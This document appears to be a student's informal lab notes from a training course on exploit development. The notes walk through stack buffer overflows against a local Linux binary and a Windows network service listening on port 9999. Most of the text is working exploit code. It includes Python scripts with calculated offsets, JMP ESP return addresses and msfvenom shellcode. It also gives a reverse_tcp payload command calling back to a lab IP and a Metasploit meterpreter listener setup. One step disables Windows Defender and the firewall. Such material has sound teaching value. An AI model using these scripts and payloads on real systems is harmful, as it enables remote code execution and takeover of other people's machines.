
bru


---------------------------------------------------LINUX----------------------------------------------------------------------


PS C:\users\student\downloads> get-content .\func | select -first 1
PS C:\users\student\downloads> scp .\func student@10.50.29.94:

student@lin-ops:~$ strings func
student@lin-ops:~$ file func


ghidra reverse engineering ...
gets buffer overlfow

use debugger:
gdb ./func
gdb-peda$ (tells us which parts may be vulnerable)
info *functions*
pdisass main (dissasembles functions)
pdisass getuserinput
red sus (vuln)
run

make script 
#!/usr/bin/env python
buffer = "A" * 55
print(buffer)

gdb-peda$ run <<<$(./rev.py) 
(make buffer bigger)

chmod
student@lin-ops:~$ ./func $(./ohio.py)
student@lin-ops:~$ ./func <<<$(./ohio.py)

https://wiremask.eu/tools/buffer-overflow-pattern-generator/
in script, put the hex in "" (buffer var)
<<<

#!/usr/bin/env python
#buffer = "A" * 100
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
print (buffer)


gdb-peda$ run <<<$(./ohio.py)
eip field: 31634130 (copy)
wiremask (register value)^ 
offset value *** (62)

#!/usr/bin/env python
buffer = "A" * 62
eip = "BBBB"
print(buffer+eip)

gdb~peda$ ./func <<<$(./ohio.py) (make sure eip is different

new lin ops
env - gdb ./func
show env (lines and columns set, lets unset them ye)
unset env COLUMNS
unset env LINES
run (enough input to break)
segmentation fault
info proc map (clean gdb)

identify top and bottom of stack (1 below heap, and on line stack)
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
                                    (jump esp)
grab first 4
in script, modify from little endian to big endian
make changes:
#jump esp location
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"      //first one
nop ="\x90" * 15              //just do this


shell code: 
(student@lin-ops:~$ msfvenom -p <payload> <option> -b '\x00' -f python )
student@lin-ops:~$ msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python


buf =  b""
buf += b"\xba\xa5\xac\xf3\x07\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x56\x14\x83\xc6\x04\x03\x56"
buf += b"\x10\x47\x59\x99\x0c\xdf\x3b\x0c\x75\xb7\x16\xd2"
buf += b"\xf0\xa0\x01\x3b\x70\x46\xd2\x2b\x59\xf4\xbb\xc5"
buf += b"\x2c\x1b\x69\xf2\x28\xdb\x8e\x02\x40\xb3\xe1\x63"
buf += b"\xc3\x2a\xfe\x34\x48\x25\x1f\x77\xee"
print(buffer+eip+nop+buf)

//print (x+x+x+x)

gdb-peda$ run <<<$(./rev.py)


exit clean gdb (not peda)
student@lin-ops:~$ msfdb init

*******msf6 payload(linux/x86/exec) > generate -b '\x00' -f python




final script:

#!/usr/bin/env python

#jump esp location
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"

buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
nop ="\x90" * 15
buf =  b""
buf += b"\xba\xa5\xac\xf3\x07\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x56\x14\x83\xc6\x04\x03\x56"
buf += b"\x10\x47\x59\x99\x0c\xdf\x3b\x0c\x75\xb7\x16\xd2"
buf += b"\xf0\xa0\x01\x3b\x70\x46\xd2\x2b\x59\xf4\xbb\xc5"
buf += b"\x2c\x1b\x69\xf2\x28\xdb\x8e\x02\x40\xb3\xe1\x63"
buf += b"\xc3\x2a\xfe\x34\x48\x25\x1f\x77\xee"
print(buffer+eip+nop+buf)


---------------------------------------------------WINDOWS----------------------------------------------------------------------



WORKIGN SCRIPT:

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost 0.0.0.0
set lport xxxxx
exploit




ls
?????? PS C:\users\student\downloads> .\SysinternalsSuite\strings.exe secureserverind
cannot be run in dos mode (windows exe)
get con
PS C:\users\student\downloads> .\secureserverind.exe
windows defender firewall (both red)
windows security: virus and threat protection all settings  turn off

new powershell: netstat -anob(admin)
look for securueserverind (9999 open)

student@lin-ops:~$ nc 10.50.29.94 9999
(nc windows op from linux op using the port open)
flashing icon: (run secureserverind again in powershell)
HELP
TRUN [any value]

ghidra: secureserver, anaylyze, search, TRUN, mem location
iVar1 = _strncmp(pcStack_1c,"TRUN ",5);
5 character limit
look at pcStack_1c 
pcStack_1c = (char *)_malloc(0x1000);     //4096
examine tf outa this shi yu hurd, no cap word ta von jit
strncpy
find function
strcpy (dest, source)
strcpy(local_7dc,param_1);
2008 <-- 3000
get a debugger(immunity run as admin)
file attach, attach secureserverind
play pause restart rewind

lin ops - create script (make sure immunipty runnning)

#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += "A" * 70  #any character in replace for 70
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #ipv4 and tcp socket
s.connect(("10.50.25.127", 9999)) #ip of win op, port open
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()


student@lin-ops:~$ chmod u+x winbuff.py 
./winbuff.py

next ->>>> find the size of that buffer jawn
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
(2008 ish)


COMMENT OUT THIS LINE ABOVE THIS BULLSHIT BELOW
buf += xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


./winbuff.py

immunity (broken boom)
eip overwritten
take eip into register wiremaksk
rewind, play

script: take away buf +x = ssssssssssssssssssssssssss
buf + "A" * 2003 (the offset in wiriemask)
buf += "BBBB"

run script, check immunity, eip overwritten

IN WHITEBAR (immunity) 
!monna modules
(checks dlls that are unprotected)

look into the dlls that are not aslr or nxcompatable for the jump esp location

IN WHITEBAR
!mona jmp -r esp -m "essfunc.dll"

window dropdown -> log data

copy addres at bottom: results (copy to clipboard address)
top 4
little endian big endian -> shit
replace 4 BBBB in script with first one

student@lin-ops:~$ msfvenom -p windows/shell/reverse_tcp lhost=10.50.29.94 lport=5555 -b "\x00" -f python

paste into script, not the orignal one set =, must be +=

msfconsole

msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
show boptions
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 5555 (port specifed earlier)
exploit / run

rewind immunity, play!@#$%^&*(QWERTYUI

add buf += "/x90" * 15 to script

------------------
script:

#!/usr/bin/env python
import socket
#0x625012A0 -> 0x62 50 12 a0 -> "\xa0\x12\x50\x62"
#0x625012AD -> 0x62 50 12 ad -> "\xad\x12\x50\x62"
#0x625012BA -> 0x62 50 12 ba -> "\xba\x12\x50\x62"
#0x625012C7 -> 0x62 50 12 c7 -> "\xc7\x12\x50\x62"

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 15
buf += b"\xb8\xbb\x1c\x7d\xfd\xdb\xd1\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x59\x83\xea\xfc\x31\x42\x10\x03\x42"
buf += b"\x10\x59\xe9\x81\x15\x12\x12\x7a\xe6\x4c\x22\xa8"
buf += b"\x82\x07\x16\x7c\xc0\x45\x9b\xf7\x84\x7d\x2a\xe2"
buf += b"\x26\xca\x66\xcb\xb3\x46\x5f\x22\x3b\x97\x5f\xe8"
buf += b"\xff\xb6\x23\xf3\xd3\x18\x1d\x3c\x26\x59\x5a\x8a"
buf += b"\x4c\xb6\x36\x5a\x24\x1a\xa7\xef\x78\xa6\xc6\x3f"
buf += b"\xf7\x96\xb0\x3a\xc8\x62\x0d\x44\x19\x01\xd5\x66"
buf += b"\xc9\x14\x35\xed\xa1\x0e\x3c\x3b\x45\x12\x0f\x43"
buf += b"\xef\xe1\x5b\x30\xf1\x23\x92\x86\x5e\x0a\x1a\x0b"
buf += b"\x9e\x4b\x9d\xf4\xd5\xa7\xdd\x89\xed\x7c\x9f\x55"
buf += b"\x7b\x62\x07\x1d\xdb\x46\xb9\xf2\xba\x0d\xb5\xbf"
buf += b"\xc9\x49\xda\x3e\x1d\xe2\xe6\xcb\xa0\x24\x6f\x8f"
buf += b"\x86\xe0\x2b\x4b\xa6\xb1\x91\x3a\xd7\xa1\x7e\xe2"
buf += b"\x7d\xaa\x6d\xf5\x02\x53\x6e\xfa\x5e\xc3\xa2\x37"
buf += b"\x61\x13\xad\x40\x12\x21\x72\xfb\xbc\x09\xfb\x25"
buf += b"\x3a\x18\xeb\xd5\x94\xa2\x7c\x28\x15\xd2\x55\xef"
buf += b"\x41\x82\xcd\xc6\xe9\x49\x0e\xe6\x3f\xe7\x04\x70"
buf += b"\xca\xc5\x0c\xc8\xa2\x2b\x2d\x9a\x3b\xa2\xcb\x4a"
buf += b"\x6c\xe4\x43\x2b\xdc\x44\x34\xc3\x36\x4b\x6b\xf3"
buf += b"\x38\x86\x04\x9e\xd6\x7e\x7c\x37\x4e\xdb\xf6\xa6"
buf += b"\x8f\xf6\x72\xe8\x04\xf2\x83\xa7\xec\x77\x90\xd0"
buf += b"\x8a\x77\x68\x21\x3f\x77\x02\x25\xe9\x20\xba\x27"
buf += b"\xcc\x06\x65\xd7\x3b\x15\x62\x27\xba\x2f\x18\x1e"
buf += b"\x28\x0f\x76\x5f\xbc\x8f\x86\x09\xd6\x8f\xee\xed"
buf += b"\x82\xdc\x0b\xf2\x1e\x71\x80\x67\xa1\x23\x74\x2f"
buf += b"\xc9\xc9\xa3\x07\x56\x32\x86\x1b\x91\xcc\x54\x34"
buf += b"\x3a\xa4\xa6\x04\xba\x34\xcd\x84\xea\x5c\x1a\xaa"
buf += b"\x05\xac\xe3\x61\x4e\xa4\x6e\xe4\x3c\x55\x6e\x2d"
buf += b"\xe0\xcb\x6f\xc2\x39\xfc\x0a\xab\xbe\xfd\xea\xa5"
buf += b"\xda\xfe\xea\xc9\xdc\xc3\x3c\xf0\xaa\x02\xfd\x47"
buf += b"\xa4\x31\xa0\xee\x2f\x39\xf6\xf1\x65"


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.29.152", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()
-----------------------------










